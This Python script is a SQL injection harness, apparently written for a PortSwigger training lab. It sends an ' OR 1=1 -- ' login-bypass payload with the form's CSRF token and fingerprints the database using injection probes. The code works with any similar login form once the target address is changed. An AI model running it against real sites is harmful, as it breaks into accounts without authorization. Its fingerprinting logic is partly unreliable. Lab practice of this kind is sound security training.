"""Canonical SQL injection harness for the PortSwigger login-form lab.

Confirms the injection with an auth-bypass POST and fingerprints the backend
DBMS. Boolean oracle is the presence of a redirect to /my-account. Handles the
session-bound CSRF token required by the login form.

Only TARGET_URL needs to change between labs. Optionally adjust PARAM_NAME.

Run:  python3 sqli_blind_reference.py
"""

import re
import requests

try:
    from urllib3.backend import HttpVersion
    from requests.adapters import HTTPAdapter

    class _H1Adapter(HTTPAdapter):
        """Force HTTP/1.1. The urllib3 hface HTTP/2 backend hangs through some proxies."""
        def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
            pool_kwargs.setdefault("disabled_svn", set()).update({HttpVersion.h2, HttpVersion.h3})
            return super().init_poolmanager(connections, maxsize, block, **pool_kwargs)

    _H1 = _H1Adapter
except Exception:
    _H1 = None

# ── CONFIG ──
TARGET_URL = "https://0a6a0041036c20af804f088400e4004e.web-security-academy.net/login"
PARAM_NAME = "username"
PASSWORD_FIELD = "password"
DUMMY_PASS = "anything"

_active_session = None
_active_csrf = None


# ── 1. HTTP CLIENT (CSRF-aware) ────────────────────────────────────────────

def _refresh_session():
    """Create a new session and fetch its CSRF token."""
    global _active_session, _active_csrf
    _active_session = requests.Session()
    if _H1 is not None:
        _active_session.mount("https://", _H1())
    _active_session.headers.update({"User-Agent": "Mozilla/5.0"})
    r = _active_session.get(TARGET_URL, timeout=10)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if not m:
        print(f"[!] CSRF not found. Status: {r.status_code}")
        return False
    _active_csrf = m.group(1)
    return True


def send_request(payload):
    """POST the payload as the username field. Returns the response or None."""
    global _active_session, _active_csrf
    if _active_session is None or _active_csrf is None:
        if not _refresh_session():
            return None
    data = {PARAM_NAME: payload, PASSWORD_FIELD: DUMMY_PASS, "csrf": _active_csrf}
    try:
        resp = _active_session.post(TARGET_URL, data=data, timeout=10, allow_redirects=False)
    except Exception as e:
        print(f"[!] Request failed: {type(e).__name__}: {e}")
        _active_session = None
        _active_csrf = None
        return None
    if resp.status_code in (301, 302, 303, 307, 308):
        _active_session = None
        _active_csrf = None
    return resp


# ── 2. PAYLOAD GENERATOR ───────────────────────────────────────────────────

def wrap(condition):
    """Wrap a condition for the login-form username context."""
    return f"' OR ({condition}) -- "


def auth_bypass():
    """Always-true login bypass payload."""
    return "' OR 1=1 -- "


# ── 3. RESPONSE ANALYZER ───────────────────────────────────────────────────

def is_true(resp):
    """TRUE iff the injection redirected to /my-account."""
    if resp is None:
        return False
    if resp.status_code in (301, 302, 303, 307, 308):
        return "my-account" in resp.headers.get("Location", "")
    return False


# ── 4. DBMS FINGERPRINTER ──────────────────────────────────────────────────

PROBES = {
    'mysql':      "/*!500001=1*/",
    'postgresql': "1=CAST((SELECT 1) AS TEXT)",
    'mssql':      "@@version IS NOT NULL",
    'oracle':     "(SELECT 1 FROM DUAL)=1",
}


def detect_dbms():
    """Return the first DBMS whose dialect probe evaluates TRUE."""
    for dbms, probe in PROBES.items():
        resp = send_request(wrap(probe))
        if is_true(resp):
            return dbms
    return 'mysql'


# ── MAIN ───────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print(f"[*] Target: {TARGET_URL}")

    print("\n[*] Step 1: Confirming injection with auth bypass...")
    resp = send_request(auth_bypass())
    if is_true(resp):
        print("[+] Auth bypass successful - injection confirmed")
    else:
        print("[-] Auth bypass failed")
        if resp:
            print(f"[-] Status: {resp.status_code}")
            print(f"[-] Location: {resp.headers.get('Location', 'none')}")
        exit()

    print("\n[*] Step 2: Detecting DBMS...")
    dbms = detect_dbms()
    print(f"[+] Detected DBMS: {dbms}")

    print(f"\n[+] Done. Injection confirmed; backend is likely {dbms}.")
